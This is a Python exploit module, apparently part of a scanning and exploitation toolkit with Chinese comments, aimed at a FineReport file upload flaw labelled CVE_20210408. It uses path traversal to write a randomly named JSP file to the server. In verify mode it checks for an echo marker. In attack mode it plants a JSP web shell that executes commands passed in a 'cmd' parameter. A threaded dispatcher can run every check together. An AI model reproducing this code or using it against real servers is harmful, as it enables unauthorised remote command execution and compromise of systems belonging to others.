from util.ExpRequest import ExpRequest,Output
from ClassCongregation import random_name
import util.globalvar as GlobalVar
"""
--FineReport--
CVE_20210408  [upload]，默认self.vuln = None
"""
class FineReport():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
            
    def CVE_20210408_FineReport(self):
        appName = 'FineReport'
        pocname = 'CVE_20210408'
        method = 'post'
        desc = 'FineReport:CVE_20210408'
        info = '[upload]'
        path = r'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/'
        payload_verify = r'{"__CONTENT__":"VuLnEcHoPoCSuCCeSS","__CHARSET__":"UTF-8"}'
        payload = r'{"__CONTENT__":"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>","__CHARSET__":"UTF-8"}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*', 
            'Content-Type': 'text/xml;charset=UTF-8', 
            'Accept-Au': '0c42b2f264071be0507acea1876c74'
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        name = random_name(6)+'.jsp'
        path += name
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=payload_verify, headers=headers, timeout=self.timeout, verify=False)
                request = exprequest.get(self.url + '/WebReport/' + name, headers=headers, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                request = exprequest.post(self.url + path, data=payload, headers=headers, timeout=self.timeout, verify=False)
                print(self.url + path)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    from concurrent.futures import ThreadPoolExecutor,wait,ALL_COMPLETED
    result_list = []
    thread_list = []
    result_list.append('----------------------------')
    #5代表只能开启5个进程, 不加默认使用cpu的进程数
    pool = ThreadPoolExecutor(int(kwargs['pool_num']))
    ExpFineReport = FineReport(**kwargs)
    if kwargs['pocname'] != 'ALL':
        #返回对象函数属性值，可以直接调用
        func = getattr(ExpFineReport, kwargs['pocname'])
        #调用函数
        return func()
    #调用所有函数
    else:
        for func in dir(FineReport):
            if not func.startswith("__"):
                thread_list.append(pool.submit(getattr(ExpFineReport, func)))
        #保存全局子线程列表
        GlobalVar.set_value('thread_list', thread_list)
        #等待所有多线程任务运行完
        wait(thread_list, return_when=ALL_COMPLETED)
        for task in thread_list:
            #去除取消掉的future任务
            if task.cancelled() == False:
                if task.result() is None:
                    result_list.append('函数没有返回值')
                else:   
                    result_list.append(task.result())
    result_list.append('----------------------------')
    return '\n'.join(result_list)

